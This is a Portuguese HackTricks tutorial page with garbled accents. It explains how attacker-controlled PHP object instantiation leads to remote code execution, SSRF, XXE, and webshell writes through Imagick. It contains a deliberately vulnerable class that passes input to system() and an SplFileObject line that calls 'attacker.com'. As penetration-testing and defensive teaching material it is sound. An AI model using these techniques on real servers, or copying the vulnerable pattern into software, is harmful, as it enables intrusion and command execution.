# PHP - RCE abusando da cria√ß√£o de objeto: new $\_GET\["a"]\($\_GET\["b"])

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs exclusivos**](https://opensea.io/collection/the-peass-family)
* **Participe do grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou do grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

## Introdu√ß√£o

Na situa√ß√£o em que voc√™ pode criar um novo objeto arbitr√°rio como `new $_GET["a"]($_GET["a"])`, voc√™ pode ser capaz de obter RCE, e [**este writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) exp√µe diferentes maneiras de conseguir RCE.

## RCE via Classes Personalizadas ou Autoload

Na constru√ß√£o `new $a($b)`, a **vari√°vel `$a` representa o nome da classe** para a qual o objeto ser√° criado, e a vari√°vel **`$b` representa o primeiro argumento** que ser√° passado para o construtor do objeto.

Se `$a` e `$b` v√™m de GET/POST, eles podem ser **strings ou arrays de strings**. Se eles v√™m de **JSON** ou de outro lugar, eles **podem ter outros tipos**, como objeto ou booleano.

Vamos considerar o seguinte exemplo:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

# Additionally, in PHP < 8.0 a constructor might be defined using the name of the class
class App2 {
function App2 ($cmd) {
system($cmd);
}
}

# Vulnerable code
$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
Neste c√≥digo, voc√™ pode definir `$a` como `App` ou `App2` e `$b` como `uname -a`. Ap√≥s isso, o comando `uname -a` ser√° executado.

Quando n√£o existem classes explor√°veis na sua aplica√ß√£o, ou voc√™ tem a classe necess√°ria em um arquivo separado que n√£o √© inclu√≠do pelo c√≥digo vulner√°vel, voc√™ pode considerar as fun√ß√µes de **autoloading**.

**Fun√ß√µes de autoloading** s√£o definidas registrando callbacks via `spl_autoload_register` ou definindo `__autoload`. Elas s√£o chamadas quando uma inst√¢ncia de uma classe desconhecida est√° tentando ser criada.
```php
# An example of an autoloading function
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

# An example of an autoloading function, works only in PHP < 8.0
function __autoload($class_name) {
include $class_name . '.php';
};

# Calling spl_autoload_register with no arguments enables the default autoloading function, which includes lowercase($classname) + .php/.inc from include_path
spl_autoload_register();
```
Dependendo da vers√£o do PHP e do c√≥digo nas fun√ß√µes de carregamento autom√°tico, algumas maneiras de obter uma Execu√ß√£o Remota de C√≥digo via carregamento autom√°tico podem existir.

## RCE via Classes Internas

Quando voc√™ n√£o tem classes personalizadas e carregamento autom√°tico, voc√™ pode confiar **apenas nas classes internas do PHP**.

Existem de 100 a 200 classes internas no PHP. O n√∫mero delas depende da vers√£o do PHP e das extens√µes instaladas. Todas as classes internas podem ser listadas atrav√©s da fun√ß√£o `get_declared_classes`, juntamente com as classes personalizadas:
```php
var_dump(get_declared_classes());
```
Classes com construtores √∫teis podem ser encontradas atrav√©s da [API de reflex√£o](https://www.php.net/manual/en/book.reflection.php).

Exibindo construtores e seus par√¢metros usando a API de reflex√£o: [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF)

![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/2.png)

Se voc√™ controla **m√∫ltiplos par√¢metros do construtor e pode chamar m√©todos arbitr√°rios** depois, existem muitas maneiras de conseguir uma Execu√ß√£o Remota de C√≥digo. Mas se voc√™ pode passar **apenas um par√¢metro e n√£o tem nenhuma chamada** ao objeto criado, h√° **quase nada**.

Eu conhe√ßo apenas tr√™s maneiras de conseguir algo de `new $a($b)`.

### **SSRF + Deserializa√ß√£o Phar**

A classe `SplFileObject` implementa um construtor que permite conex√£o com qualquer URL local ou remota:
```
new SplFileObject('http://attacker.com/');
```
Isso permite SSRF. Al√©m disso, SSRFs em PHP < 8.0 poderiam ser transformados em deserializa√ß√µes por meio de t√©cnicas com o protocolo Phar.

### **Explorando PDOs**

A classe PDO tem outro construtor interessante:
```php
new PDO("sqlite:/tmp/test.txt")
```
O construtor `PDO` aceita strings DSN, permitindo-nos **conectar a qualquer banco de dados local ou remoto** usando **extens√µes de banco de dados instaladas**. Por exemplo, a extens√£o SQLite pode criar arquivos vazios.

### **SoapClient/SimpleXMLElement XXE**

No PHP ‚â§ 5.3.22 e ‚â§ 5.4.12, o construtor do SoapClient era **vulner√°vel a XXE**. O construtor do SimpleXMLElement tamb√©m era vulner√°vel a XXE, mas exigia libxml2 < 2.9.

## RCE via Extens√£o Imagick

Verificando as **depend√™ncias** do **projeto** que voc√™ est√° tentando explorar, voc√™ poderia encontrar **novas classes** que poderiam ser **abusadas para executar comandos** criando um novo objeto. Neste caso, **Imagick** foi encontrado como √∫til para esse prop√≥sito.

### Analisador VID

O analisador VID permite escrever conte√∫do arbitr√°rio em um caminho arbitr√°rio dentro do sistema de arquivos, o que permitiria a um atacante escrever um PHPshell em uma pasta acess√≠vel pela p√°gina web e obter RCE.

![](<../../../.gitbook/assets/image (157) (3).png>)

#### Analisador VID + Upload de Arquivo

Quando um arquivo √© carregado para o PHP, ele √© temporariamente armazenado em `/tmp/phpXXXXXX`. O analisador VID do Imagick com o protocolo **msl** permite **especificar curingas nos caminhos dos arquivos** (para que o arquivo carregado temporariamente possa ser facilmente acessado) e **copi√°-lo para qualquer local arbitr√°rio**.\
Esta √© outra maneira de obter escrita de arquivo arbitr√°rio dentro do sistema de arquivos:

![](<../../../.gitbook/assets/image (159).png>)

### Travamento do PHP + For√ßa Bruta

O [**writeup original**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) explicou outra maneira de obter RCE **carregando arquivos com conte√∫do espec√≠fico** e fazendo o **servidor travar antes de deletar** esse arquivo e ent√£o **for√ßando bruta o nome** do arquivo tempor√°rio at√© que **Imagick execute c√≥digo PHP arbitr√°rio**.

No entanto, aparentemente o **truque de travamento** descoberto s√≥ **funcionava em uma vers√£o antiga do ImageMagick**.

## Refer√™ncias

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**merchandising oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
